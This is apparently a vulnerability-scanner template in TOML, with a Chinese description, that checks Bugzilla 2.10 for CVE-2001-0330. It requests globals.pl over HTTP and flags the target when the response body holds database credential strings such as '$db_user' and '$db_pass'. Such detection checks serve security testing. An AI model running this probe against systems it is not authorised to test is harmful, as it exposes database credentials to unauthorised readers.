[info]
author = "ave"
description = "检测 Bugzilla 2.10 是否存在敏感信息泄露漏洞。该漏洞允许未经认证的远程攻击者通过 HTTP 请求直接读取 globals.pl 文件内容，获取数据库用户名和密码等敏感凭据，因为 Web 服务器通常返回该文件内容而不执行。"
id = "POC-AVE-2001-0721"
name = "Mozilla Bugzilla 敏感信息泄露漏洞 PoC"
severity = "high"
tags = ["ave-2001-0721"]
vuln_id = [
    "CVE-2001-0330",
    "AVE-2001-0721",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/globals.pl"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "$db_name",
    "$db_pass",
    "$db_user",
    "password",
]
